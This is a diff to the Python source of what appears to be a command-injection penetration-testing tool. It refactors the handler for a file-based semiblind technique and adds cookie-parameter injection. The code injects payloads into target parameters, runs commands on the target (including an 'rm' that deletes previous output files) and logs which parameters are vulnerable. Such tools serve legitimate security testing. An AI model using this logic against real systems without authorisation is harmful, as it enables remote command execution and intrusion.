@@ -25,7 +25,9 @@ import urllib
 import urllib2
 
 from src.utils import menu
+from src.utils import logs
 from src.utils import settings
+
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.requests import headers
@@ -41,6 +43,7 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_ha
  The "file-based" technique on Semiblind-based OS Command Injection.
 """
 
+
 # If temp-based technique failed, 
 # use the "/tmp/" directory for tempfile-based technique.
 def tfb_controller(no_result, url, delay, tmp_path, filename, http_request_method):
@@ -51,17 +54,19 @@ def tfb_controller(no_result, url, delay, tmp_path, filename, http_request_metho
     sys.stdout.write("\r")
     sys.stdout.flush()
 
+
 # Delete previous shells outputs.
 def delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   cmd = "rm " + OUTPUT_TEXTFILE
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell=None)
 
-#-----------------------------------------------
-# The "file-based" injection technique handler
-#-----------------------------------------------
+
+"""
+The "file-based" injection technique handler
+"""
 def fb_injection_handler(url, delay, filename, http_request_method):
 
-  counter = 0
+  counter = 1
   vp_flag = True
   exit_loops = False
   no_result = True
@@ -71,7 +76,8 @@ def fb_injection_handler(url, delay, filename, http_request_method):
   export_injection_info = False
   injection_type = "Semiblind-based Command Injection"
   technique = "file-based semiblind injection technique"
-  
+
+  # Set temp path 
   if menu.options.tmp_path:
     tmp_path = menu.options.tmp_path
   else:
@@ -114,10 +120,10 @@ def fb_injection_handler(url, delay, filename, http_request_method):
 
         try:
           # File-based decision payload (check if host is vulnerable).
-          if not alter_shell :
-            payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
-          else:
+          if alter_shell :
             payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
+          else:
+            payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
                   
           # Check if defined "--prefix" option.
           # Fix prefixes / suffixes
@@ -127,9 +133,15 @@ def fb_injection_handler(url, delay, filename, http_request_method):
           # Check if defined "--verbose" option.
           if menu.options.verbose:
             sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
-            
-          # Check if target host is vulnerable.
-          response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)
+
+          # Cookie Injection
+          if settings.COOKIE_INJECTION == True:
+            # Check if target host is vulnerable to cookie injection.
+            vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
+            response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)
+          else:
+            # Check if target host is vulnerable.
+            response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)
 
           # Find the directory.
           path = url
@@ -227,60 +239,29 @@ def fb_injection_handler(url, delay, filename, http_request_method):
           found = True
           no_result = False
           
+          if settings.COOKIE_INJECTION == True: 
+            http_request_method = "cookie"
+            found_vuln_parameter = vuln_parameter
+          else:
+            if http_request_method == "GET":
+              found_vuln_parameter = parameters.vuln_GET_param(url)
+            else :
+              found_vuln_parameter = vuln_parameter
+
           # Print the findings to log file.
           if export_injection_info == False:
-            output_file = open(filename + ".txt", "a")
-            output_file.write("\n(+) Type : " + injection_type)
-            output_file.write("\n(+) Technique : " + technique.title())
-            output_file.close()
-            export_injection_info = True
-  
-          if http_request_method == "GET":
-            # Print the findings to log file
-            if vp_flag == True:
-              output_file = open(filename + ".txt", "a")
-              output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-              output_file.write("\n")
-              vp_flag = False
-              output_file.close()
-              
-            counter = counter + 1
-            output_file = open(filename + ".txt", "a")
-            output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
-            output_file.close()
-            
-            #Vulnerable Parameter
-            GET_vuln_param = parameters.vuln_GET_param(url)
-              
-            # Print the findings to terminal.
-            print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + GET_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
-            print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-            print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-            print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
-
-          else :
-            # Print the findings to log file
-            if vp_flag == True:
-              output_file = open(filename + ".txt", "a")
-              output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-              output_file.write("\n")
-              vp_flag = False
-              output_file.close()
-              
-            counter = counter + 1
-            output_file = open(filename + ".txt", "a")
-            output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
-            output_file.close()
-            
-            #Vulnerable Parameter
-            POST_vuln_param = vuln_parameter
-            
-            # Print the findings to terminal.
-            print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + POST_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
-            print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-            print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-            print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
-            
+            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
+          if vp_flag == True:
+            vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
+          logs.upload_payload(filename, counter, payload) 
+          counter = counter + 1
+          
+          # Print the findings to terminal.
+          print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
+          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
+          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
+          
           # Check for any enumeration options.
           fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
 
@@ -301,7 +282,6 @@ def fb_injection_handler(url, delay, filename, http_request_method):
                     sys.exit(0)
                     
                   else:
-                    # The main command injection exploitation.
                     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
                     print ""
                     # Command execution results.
@@ -339,7 +319,12 @@ def fb_injection_handler(url, delay, filename, http_request_method):
   else :
     sys.stdout.write("\r")
     sys.stdout.flush()
+
     
+"""
+The exploitation function.
+(call the injection handler)
+""" 
 def exploitation(url, delay, filename, http_request_method):
     if fb_injection_handler(url, delay, filename, http_request_method) == False:
       return False
